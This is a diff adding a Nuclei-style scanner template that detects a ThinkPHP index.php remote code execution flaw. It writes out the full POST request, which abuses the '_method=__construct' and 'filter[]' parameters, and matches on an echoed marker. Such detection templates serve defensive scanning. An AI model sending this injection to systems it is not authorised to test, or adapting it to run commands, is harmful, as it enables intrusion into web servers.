@@ -1,0 +1,22 @@
+id: thinkphp-index-construct-rce
+info:
+  name: ThinkPHP index.php Remote Code Execution Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,thinkphp
+  description: |
+    ThinkPHP index.php is vulnerable to Remote Code Execution (RCE) due to unsafe handling of input data.
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/index.php?s=index/index/index"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      s=4e5e5d7364f443e28fbf0d3ae744a59a&_method=__construct&method&filter[]=print_r
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "4e5e5d7364f443e28fbf0d3ae744a59a__constructprint_r4e5e5d7364f443e28fbf0d3ae744a59a__constructprint_r"
+        part: body
